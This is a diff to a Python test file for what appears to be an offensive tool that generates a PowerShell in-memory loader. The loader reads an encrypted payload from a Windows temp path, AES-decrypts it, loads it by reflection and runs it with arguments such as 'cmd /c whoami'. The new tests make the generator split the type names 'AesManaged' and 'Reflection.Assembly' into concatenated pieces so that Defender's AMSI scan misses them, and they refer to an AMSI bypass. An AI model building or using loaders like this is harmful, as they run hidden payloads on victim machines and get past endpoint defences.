@@ -83,18 +83,69 @@ class TestBuildLoader:
         # Reads encrypted blob
         assert "ReadAllBytes" in loader
         assert r"C:\Windows\Temp\x.dat" in loader
-        # AES decryption present
-        assert "AesMan" in loader or "AesManaged" in loader.replace(
-            "'+'", "")
-        # Reflection load (broken up but reconstructable)
+        # Strip PowerShell-side concatenations to recover full identifiers
         ps = loader.replace("'+'", "")
-        assert "Reflection.Assembly" in ps
+        # AES decryption present (reconstructed via PS-runtime concat)
+        assert "AesManaged" in ps
+        # Reflection load (reconstructed via PS-runtime concat)
+        assert "System.Reflection.Assembly" in ps
         # Args passed through
         assert "cmd /c whoami" in loader
         assert "lsarpc" in loader
         # Result captured
         assert "WriteAllText" in loader
         assert r"C:\Windows\Temp\r.txt" in loader
+
+    def test_loader_uses_runtime_string_concatenation(self):
+        """The dangerous type names MUST NOT appear as one literal in
+        the rendered script -- Defender's static AMSI scan reads the
+        script text and pattern-matches on `AesManaged` /
+        `Reflection.Assembly`. PowerShell-side concatenation hides
+        them until runtime, when AMSI is already neutralised."""
+        loader = build_in_memory_loader_ps(
+            encrypted_path=r"C:\x.dat",
+            key_b64="QQ==",
+            entry_args=["x"],
+            result_path=r"C:\r.txt",
+        )
+        # Literal `Security.Cryptography.AesManaged` must NOT appear
+        assert "Security.Cryptography.AesManaged" not in loader
+        # Literal `Reflection.Assembly` must NOT appear
+        assert "Reflection.Assembly" not in loader
+        # But the pieces are there for PowerShell to concat at runtime
+        assert "'Sec'+'urity.Cryp'" in loader
+        assert "'tem.Refl'+'ection.Ass'" in loader
+
+    def test_loader_args_use_comma_unary_wrapping(self):
+        """EntryPoint.Invoke(null, args) needs args to be a single-
+        element Object[] whose [0] is the string[]. The comma-unary
+        operator `,(...)` is the PowerShell idiom. Without it
+        `@(([string[]]@(...)))` unwraps and Main(string[]) gets
+        called as Main(arg0, arg1) -> TargetInvocationException."""
+        loader = build_in_memory_loader_ps(
+            encrypted_path=r"C:\x.dat",
+            key_b64="QQ==",
+            entry_args=["whoami", "lsarpc"],
+            result_path=r"C:\r.txt",
+        )
+        # The Invoke line must wrap the args with the comma-unary
+        assert ",(" in loader and "EntryPoint.Invoke" in loader
+        # Specifically, the pattern is .Invoke($null,(,(...
+        assert ".Invoke($null,(,(" in loader
+
+    def test_loader_dollar_args_mode(self):
+        """When use_dollar_args=True, the script reads args from
+        PowerShell's $args (populated when invoked via -File)."""
+        loader = build_in_memory_loader_ps(
+            encrypted_path=r"C:\x.dat",
+            key_b64="QQ==",
+            entry_args=None,
+            result_path=r"C:\r.txt",
+            use_dollar_args=True,
+        )
+        assert "[string[]]$args" in loader
+        # Same comma-unary wrapping required for $args path
+        assert ".Invoke($null,(,([string[]]$args)))" in loader
 
     def test_loader_escapes_apostrophes(self):
         loader = build_in_memory_loader_ps(
@@ -118,8 +169,9 @@ class TestBuildLoader:
         )
         # Without bypass, no GetField('amsi...') call
         assert "siIn" not in loader  # part of amsiInitFailed
-        # But the load+invoke is still there
-        assert "Reflect" in loader
+        # But the load+invoke is still there (string-concatenated)
+        assert "$rT=" in loader
+        assert "EntryPoint.Invoke" in loader
 
     def test_loader_no_result_path_skips_capture(self):
         loader = build_in_memory_loader_ps(
